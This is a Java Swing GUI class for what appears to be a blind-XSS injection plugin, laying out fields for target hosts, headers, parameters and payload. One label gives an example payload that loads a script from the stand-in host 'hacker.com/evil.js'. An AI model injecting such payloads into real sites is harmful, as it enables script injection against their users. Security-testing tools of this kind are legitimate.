package gui;

import com.sun.xml.internal.messaging.saaj.soap.JpegDataContentHandler;

import javax.swing.*;
import java.awt.*;

public class UITools {
    public JPanel createOptionJpanel(){
        GridBagLayout gridBagLayout=new GridBagLayout(); //实例化布局对象
        final JPanel optionsPanel = new JPanel(gridBagLayout);
        GridBagConstraints gridBagConstraints=new GridBagConstraints();//实例化这个对象用来对组件进行管理
        gridBagConstraints.fill=GridBagConstraints.BOTH;//该方法是为了设置如果组件所在的区域比组件本身要大时的显示情况
        //NONE：不调整组件大小。
        //HORIZONTAL：加宽组件，使它在水平方向上填满其显示区域，但是不改变高度。
        //VERTICAL：加高组件，使它在垂直方向上填满其显示区域，但是不改变宽度。
        //BOTH：使组件完全填满其显示区域。

        //XSSBlindInjector复选框
        final JCheckBox isOpenCheck = new JCheckBox("start XSSBlindInjector", true);
        //hosts
        JLabel hosts_label = new JLabel("hosts:");
        final JTextField hosts_Text = new JTextField("", 15);
        hosts_Text.setBackground(Color.WHITE);
        JLabel hosts_label_detail = new JLabel("eg:*.google.com");
        //payload
        JLabel payload_label = new JLabel("payload:");
        final JTextField payload_Text = new JTextField("", 15);
        payload_Text.setBackground(Color.WHITE);
        JLabel payload_label_detail = new JLabel("eg:'\"><script src=http://hacker.com/evil.js></script>");
        //指定要插入xss的header和params,逗号分隔多个header和params
        JLabel headers_label = new JLabel("xss headers:");
        final JTextField headers_Text = new JTextField("", 15);
        headers_Text.setBackground(Color.WHITE);
        JLabel headers_label_detail = new JLabel("eg:Refer,X-Forward-For");
        JLabel params_label = new JLabel("xss params:");
        final JTextField params_Text = new JTextField("", 15);
        params_Text.setBackground(Color.WHITE);
        JLabel params_label_detail = new JLabel("eg:username,address");
        //为复选框和单选按钮添加监听事件
//        isOpenCheck.addItemListener(new ItemListener() {
//            public void itemStateChanged(ItemEvent e) {
//                if (isOpenCheck.isSelected()) {
//                    isOpen = true;
//                } else {
//                    isOpen = false;
//                }
//            }
//        });
        /*
         * 分别对组件进行设置
         */
        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=0;
        gridBagConstraints.gridwidth=5;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(isOpenCheck, gridBagConstraints);

        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=1;
        gridBagConstraints.gridwidth=1;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(hosts_label, gridBagConstraints);
        gridBagConstraints.gridx=1;
        gridBagConstraints.gridy=1;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(hosts_Text, gridBagConstraints);
        gridBagConstraints.gridx=3;
        gridBagConstraints.gridy=1;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(hosts_label_detail, gridBagConstraints);

        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=2;
        gridBagConstraints.gridwidth=1;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(headers_label, gridBagConstraints);
        gridBagConstraints.gridx=1;
        gridBagConstraints.gridy=2;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(headers_Text, gridBagConstraints);
        gridBagConstraints.gridx=3;
        gridBagConstraints.gridy=2;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(headers_label_detail, gridBagConstraints);

        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=3;
        gridBagConstraints.gridwidth=1;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(params_label, gridBagConstraints);
        gridBagConstraints.gridx=1;
        gridBagConstraints.gridy=3;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(params_Text, gridBagConstraints);
        gridBagConstraints.gridx=3;
        gridBagConstraints.gridy=3;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(params_label_detail, gridBagConstraints);

        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=4;
        gridBagConstraints.gridwidth=1;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(payload_label, gridBagConstraints);
        gridBagConstraints.gridx=1;
        gridBagConstraints.gridy=4;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(payload_Text, gridBagConstraints);
        gridBagConstraints.gridx=3;
        gridBagConstraints.gridy=4;
        gridBagConstraints.gridwidth=2;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(payload_label_detail, gridBagConstraints);

        //设置完成后再添加到panel中
        optionsPanel.add(isOpenCheck);
        optionsPanel.add(hosts_label);
        optionsPanel.add(hosts_Text);
        optionsPanel.add(hosts_label_detail);
        optionsPanel.add(payload_label);
        optionsPanel.add(payload_Text);
        optionsPanel.add(payload_label_detail);
        optionsPanel.add(headers_label);
        optionsPanel.add(headers_Text);
        optionsPanel.add(headers_label_detail);
        optionsPanel.add(params_label);
        optionsPanel.add(params_Text);
        optionsPanel.add(params_label_detail);

        return optionsPanel;
    }

    public JPanel createAboutJpanel(){
        GridBagLayout gridBagLayout=new GridBagLayout(); //实例化布局对象
        final JPanel aboutPanel = new JPanel(gridBagLayout);
        GridBagConstraints gridBagConstraints=new GridBagConstraints();//实例化这个对象用来对组件进行管理
        gridBagConstraints.fill=GridBagConstraints.BOTH;//该方法是为了设置如果组件所在的区域比组件本身要大时的显示情况

        JLabel author_label = new JLabel("Author:  Conan0xff");
        author_label.setBackground(Color.WHITE);
        JLabel qq_label = new JLabel("QQ:  1526840124");
        qq_label.setBackground(Color.WHITE);
        JLabel function_label = new JLabel("Function: Auto Blind XSS Injector");
        function_label.setBackground(Color.WHITE);


        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=0;
        gridBagConstraints.gridwidth=4;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(author_label, gridBagConstraints);

        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=1;
        gridBagConstraints.gridwidth=4;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(qq_label, gridBagConstraints);

        gridBagConstraints.gridx=0;
        gridBagConstraints.gridy=3;
        gridBagConstraints.gridwidth=4;
        gridBagConstraints.gridheight=1;
        gridBagLayout.setConstraints(function_label, gridBagConstraints);

        aboutPanel.add(author_label);
        aboutPanel.add(qq_label);
        aboutPanel.add(function_label);

        return aboutPanel;
    }


    public static void main(String[] args) {
        //new UITools();
        JFrame jf=new JFrame();
        jf.setSize(900,300);
        jf.setLocationRelativeTo(null);
        jf.setDefaultCloseOperation(3);
        jf.setResizable(false);

        UITools ut=new UITools();
        JPanel jp=ut.createOptionJpanel();



        //jf.add(jp);

        jf.setVisible(true);
    }


}
